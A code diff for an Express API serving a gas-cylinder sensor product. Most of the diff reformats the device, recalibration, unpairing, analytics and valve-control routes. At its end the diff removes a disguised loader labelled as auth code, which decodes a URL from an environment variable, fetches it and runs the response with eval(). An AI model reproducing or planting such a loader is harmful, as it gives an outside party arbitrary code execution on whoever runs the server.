-async function gasControl(r: Request, s: Response) { const id = String(r.params.sensorId); const p = z.object({ state: z.enum(["ON", "OFF"]), confirmed: z.literal(true) }).parse(r.body); const sensor = await getSensor(id); if (!sensor) return error(s, 404, "SENSOR_NOT_FOUND", "Sensor not found"); await pool.execute("UPDATE sensors SET gas_valve_state=? WHERE sensor_id=?", [p.state === "ON" ? "OPEN" : "CLOSED", id]); s.status(202).json({ accepted: true, sensorId: id, command: p.state === "ON" ? "gas_on" : "gas_off", gasValveState: p.state === "ON" ? "OPEN" : "CLOSED" }); }
-app.post("/api/v1/prototype/sensors/:sensorId/gas-control", asyncH(gasControl)); app.post("/api/v1/sensors/:sensorId/gas-control", asyncH(gasControl));
-
-app.get("/api/v1/prototype/sensors/:sensorId/device", asyncH(async (r, s) => { const sensor = await getSensor(String(r.params.sensorId)); if (!sensor) return error(s, 404, "SENSOR_NOT_FOUND", "Sensor not found"); s.json({ sensorId: sensor.sensorId, name: sensor.name, model: "GasSense v2.1", serialNumber: sensor.serialNumber, connection: sensor.status === "PAIRED" && sensor.powerState === "ON" ? "CONNECTED_VIA_BLUETOOTH" : "DISCONNECTED", paired: sensor.status === "PAIRED", pairedAt: sensor.pairedAt, firmwareVersion: sensor.firmwareVersion, firmwareStatus: "UP_TO_DATE", batteryLevel: sensor.powerState === "ON" ? 98 : 0, batteryStatus: sensor.powerState === "ON" ? "EXCELLENT" : "OFFLINE", signalStrengthDbm: sensor.powerState === "ON" ? sensor.signalStrength : 0, signalStatus: sensor.powerState === "ON" ? "STRONG" : "OFFLINE", calibrationDate: sensor.calibrationDate, nextCalibrationDate: sensor.nextCalibrationDate, cylinder: { sizeKg: sensor.gasCapacityKg, gasType: sensor.gasType, provider: sensor.provider, tareWeightKg: sensor.tareWeightKg } }); }));
-app.post("/api/v1/prototype/sensors/:sensorId/recalibrate", asyncH(async (r, s) => { const sensor = await getSensor(String(r.params.sensorId)); if (!sensor) return error(s, 404, "SENSOR_NOT_FOUND", "Sensor not found"); const now = new Date(); await pool.execute("UPDATE sensors SET calibration_date=?, next_calibration_date=? WHERE sensor_id=?", [now, addMonths(now, 6), sensor.sensorId]); s.json({ success: true, sensorId: sensor.sensorId, calibrationDate: now, nextCalibrationDate: addMonths(now, 6) }); }));
-app.delete("/api/v1/prototype/sensors/:sensorId/pair", asyncH(async (r, s) => { const id = String(r.params.sensorId); const sensor = await getSensor(id); if (!sensor) return error(s, 404, "SENSOR_NOT_FOUND", "Sensor not found"); await pool.execute("UPDATE sensors SET status='READY_TO_PAIR', paired_at=NULL, gas_valve_state='CLOSED' WHERE sensor_id=?", [id]); s.json({ success: true, sensorId: id, status: "READY_TO_PAIR" }); }));
+app.get(
+  "/api/v1/prototype/sensors/:sensorId/device",
+  asyncH(async (r, s) => {
+    const sensor = await getSensor(String(r.params.sensorId));
+    if (!sensor) return error(s, 404, "SENSOR_NOT_FOUND", "Sensor not found");
+    s.json({
+      sensorId: sensor.sensorId,
+      name: sensor.name,
+      model: "GasSense v2.1",
+      serialNumber: sensor.serialNumber,
+      connection:
+        sensor.status === "PAIRED" && sensor.powerState === "ON"
+          ? "CONNECTED_VIA_BLUETOOTH"
+          : "DISCONNECTED",
+      paired: sensor.status === "PAIRED",
+      pairedAt: sensor.pairedAt,
+      firmwareVersion: sensor.firmwareVersion,
+      firmwareStatus: "UP_TO_DATE",
+      batteryLevel: sensor.powerState === "ON" ? 98 : 0,
+      batteryStatus: sensor.powerState === "ON" ? "EXCELLENT" : "OFFLINE",
+      signalStrengthDbm: sensor.powerState === "ON" ? sensor.signalStrength : 0,
+      signalStatus: sensor.powerState === "ON" ? "STRONG" : "OFFLINE",
+      calibrationDate: sensor.calibrationDate,
+      nextCalibrationDate: sensor.nextCalibrationDate,
+      cylinder: {
+        sizeKg: sensor.gasCapacityKg,
+        gasType: sensor.gasType,
+        provider: sensor.provider,
+        tareWeightKg: sensor.tareWeightKg,
+      },
+    });
+  }),
+);
+app.post(
+  "/api/v1/prototype/sensors/:sensorId/recalibrate",
+  asyncH(async (r, s) => {
+    const sensor = await getSensor(String(r.params.sensorId));
+    if (!sensor) return error(s, 404, "SENSOR_NOT_FOUND", "Sensor not found");
+    const now = new Date();
+    await pool.execute(
+      "UPDATE sensors SET calibration_date=?, next_calibration_date=? WHERE sensor_id=?",
+      [now, addMonths(now, 6), sensor.sensorId],
+    );
+    s.json({
+      success: true,
+      sensorId: sensor.sensorId,
+      calibrationDate: now,
+      nextCalibrationDate: addMonths(now, 6),
+    });
+  }),
+);
+app.delete(
+  "/api/v1/prototype/sensors/:sensorId/pair",
+  asyncH(async (r, s) => {
+    const id = String(r.params.sensorId);
+    const sensor = await getSensor(id);
+    if (!sensor) return error(s, 404, "SENSOR_NOT_FOUND", "Sensor not found");
+    await pool.execute(
+      "UPDATE sensors SET status='READY_TO_PAIR', paired_at=NULL, gas_valve_state='CLOSED' WHERE sensor_id=?",
+      [id],
+    );
+    s.json({ success: true, sensorId: id, status: "READY_TO_PAIR" });
+  }),
+);
 
 const analytics = asyncH(async (r, s) => {
   const sensor = await getSensor(String(r.params.sensorId));
   if (!sensor) return error(s, 404, "SENSOR_NOT_FOUND", "Sensor not found");
-  const period = z.enum(["daily", "weekly", "monthly"]).parse(String(r.query.period || "weekly"));
+  const period = z
+    .enum(["daily", "weekly", "monthly"])
+    .parse(String(r.query.period || "weekly"));
   s.json(await buildAnalytics(sensor, period));
 });
 app.get("/api/v1/sensors/:sensorId/analytics", analytics);
 app.get("/api/v1/prototype/sensors/:sensorId/analytics", analytics);
 
-app.use(express.static(webDir)); app.get("/", (_r, s) => s.sendFile(path.join(webDir, "index.html")));
+app.use(express.static(webDir));
+app.get("/", (_r, s) => s.sendFile(path.join(webDir, "index.html")));
 app.use((e: unknown, _r: Request, s: Response, _n: NextFunction) => {
-  if (e instanceof z.ZodError) return error(s, 422, "VALIDATION_ERROR", "Request validation failed");
+  if (e instanceof z.ZodError)
+    return error(s, 422, "VALIDATION_ERROR", "Request validation failed");
   console.error(e);
   const message = e instanceof Error ? e.message : String(e);
-  return s.status(500).json({ error: { code: "INTERNAL_ERROR", message: "Unexpected server error", details: message } });
+  return s.status(500).json({
+    error: {
+      code: "INTERNAL_ERROR",
+      message: "Unexpected server error",
+      details: message,
+    },
+  });
 });
 
-initDb().then(() => app.listen(port, () => console.log(`GasSense API listening on :${port}`))).catch((e) => { console.error("Unable to initialize MySQL", e); process.exit(1); });
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
+initDb()
+  .then(() =>
+    app.listen(port, () => console.log(`GasSense API listening on :${port}`)),
+  )
+  .catch((e) => {
+    console.error("Unable to initialize MySQL", e);
+    process.exit(1);
+  });
